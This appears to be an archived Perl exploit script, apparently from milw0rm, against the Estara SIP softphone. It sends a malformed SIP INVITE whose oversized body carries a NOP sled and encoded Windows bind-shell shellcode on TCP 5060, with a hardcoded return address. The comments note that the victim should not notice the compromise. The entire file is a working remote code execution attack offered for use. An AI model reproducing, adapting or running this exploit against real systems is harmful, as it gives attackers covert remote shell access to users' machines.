#!/usr/bin/perl -s
# damn-hippie.pl by kokanin (google estara, it shows sip stuff and a hippie)
# Remote "estara softphone" exploit, executable version info = 3.0.1.2
# kokanin did the research, metasploit.com did the encoded bindshell on tcp/5060
# Lets face it, most users wont know the difference between tcp and udp even if 
# if it bites them in the ass, so the port is chosen in the hope that nat'ed
# users forward both tcp and udp port 5060 to their machine to make sip stuff
# work without all that hard thinking taking place.

# this used to be 0day, but I saw someone release something called estara.c
# on packetstorm today. I don't know if it's even the same bug, but this
# exploit is better anyway, so there.

# win32_bind, \x00\x0a\x0d encoded, [ EXITFUNC=thread LPORT=5060 Size=399 ] 
# again, provided by http://metasploit.com (facing more stuff, I wouldn't know
# how to write win32 shellcode even if someone bit me in the ass :)
# since the shellcode exits the thread the user should not notice anything.

use IO::Socket;
if(!$ARGV[0])
{ print "I am private, do not use me. Tell kokanin how you got me\n"; exit(-1); }
my $ret = pack("l",0x0303DCDF); # jmp di in softphone.exe, seems stable
my $buflen = 4099;

my $shellcode =
"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x08\xb3".
"\x06\x82\x83\xeb\xfc\xe2\xf4\xf4\x5b\x50\x82\x08\xb3\x55\xd7\x5e".
"\xe4\x8d\xee\x2c\xab\x8d\xc7\x34\x38\x52\x87\x70\xb2\xec\x09\x42".
"\xab\x8d\xd8\x28\xb2\xed\x61\x3a\xfa\x8d\xb6\x83\xb2\xe8\xb3\xf7".
"\x4f\x37\x42\xa4\x8b\xe6\xf6\x0f\x72\xc9\x8f\x09\x74\xed\x70\x33".
"\xcf\x22\x96\x7d\x52\x8d\xd8\x2c\xb2\xed\xe4\x83\xbf\x4d\x09\x52".
"\xaf\x07\x69\x83\xb7\x8d\x83\xe0\x58\x04\xb3\xc8\xec\x58\xdf\x53".
"\x71\x0e\x82\x56\xd9\x36\xdb\x6c\x38\x1f\x09\x53\xbf\x8d\xd9\x14".
"\x38\x1d\x09\x53\xbb\x55\xea\x86\xfd\x08\x6e\xf7\x65\x8f\x45\x89".
"\x5f\x06\x83\x08\xb3\x51\xd4\x5b\x3a\xe3\x6a\x2f\xb3\x06\x82\x98".
"\xb2\x06\x82\xbe\xaa\x1e\x65\xac\xaa\x76\x6b\xed\xfa\x80\xcb\xac".
"\xa9\x76\x45\xac\x1e\x28\x6b\xd1\xba\xf3\x2f\xc3\x5e\xfa\xb9\x5f".
"\xe0\x34\xdd\x3b\x81\x06\xd9\x85\xf8\x26\xd3\xf7\x64\x8f\x5d\x81".
"\x70\x8b\xf7\x1c\xd9\x01\xdb\x59\xe0\xf9\xb6\x87\x4c\x53\x86\x51".
"\x3a\x02\x0c\xea\x41\x2d\xa5\x5c\x4c\x31\x7d\x5d\x83\x37\x42\x58".
"\xe3\x56\xd2\x48\xe3\x46\xd2\xf7\xe6\x2a\x0b\xcf\x82\xdd\xd1\x5b".
"\xdb\x04\x82\x1b\x77\x8f\x62\x62\xa3\x56\xd5\xf7\xe6\x22\xd1\x5f".
"\x4c\x53\xaa\x5b\xe7\x51\x7d\x5d\x93\x8f\x45\x60\xf0\x4b\xc6\x08".
"\x3a\xe5\x05\xf2\x82\xc6\x0f\x74\x97\xaa\xe8\x1d\xea\xf5\x29\x8f".
"\x49\x85\x6e\x5c\x75\x42\xa6\x18\xf7\x60\x45\x4c\x97\x3a\x83\x09".
"\x3a\x7a\xa6\x40\x3a\x7a\xa6\x44\x3a\x7a\xa6\x58\x3e\x42\xa6\x18".
"\xe7\x56\xd3\x59\xe2\x47\xd3\x41\xe2\x57\xd1\x59\x4c\x73\x82\x60".
"\xc1\xf8\x31\x1e\x4c\x53\x86\xf7\x63\x8f\x64\xf7\xc6\x06\xea\xa5".
"\x6a\x03\x4c\xf7\xe6\x02\x0b\xcb\xd9\xf9\x7d\x3e\x4c\xd5\x7d\x7d".
"\xb3\x6e\x6d\xc6\x53\x66\x7d\x5d\xb7\x37\x59\x5b\x4c\xd6\x82";

my $buffer = "\x90" x ($buflen - length($shellcode)) . $shellcode;

my $sipinvite = 

"INVITE sip:snotboble\@solgryn.fi.st SIP/2.0\r\n".
"Via: SIP/2.0/UDP abcdabcd.fi.st:1234;branch=somebranchidhere\r\n".
"From: 2448 <sip:kagemand\@abcdabcd.fi.st>;tag=2448\r\n".
"To: Receiver <sip:snotboble\@solgryn.fi.st>\r\n".
"Call-ID: 0\@abcdabcd.fi.st\r\n".
"CSeq: 1 INVITE\r\n".
"Contact: 2448 <sip:kagemand\@abcdabcd.fi.st>\r\n".
"Expires: 1200\r\n".
"Max-Forwards: 70\r\n".
"Content-Type: application/sdp\r\n".
"Content-Length: 4234\r\n".
"\r\n".
$buffer . 
"=0\r\n".
"o=2448 2448 2448 IN IP4 " . $ret . "DCBA.fi.st\r\n".
"s=Session SDP\r\n".
"c=IN IP4 123.123.12.34\r\n".
"t=0 0\r\n".
"m=audio 9876 RTP/AVP 0\r\n".
"a=rtpmap:0 PCMU/8000\r\n".
"\r\n";
$host = $ARGV[0];
$port = 5060;

$socket = new IO::Socket::INET
(
Proto    => "udp",
PeerAddr => $host,
PeerPort => $port,
);

die "unable to connect to $host:$port ($!)\n" unless $socket;

print $socket $sipinvite; 

close($socket);

# milw0rm.com [2006-01-12]
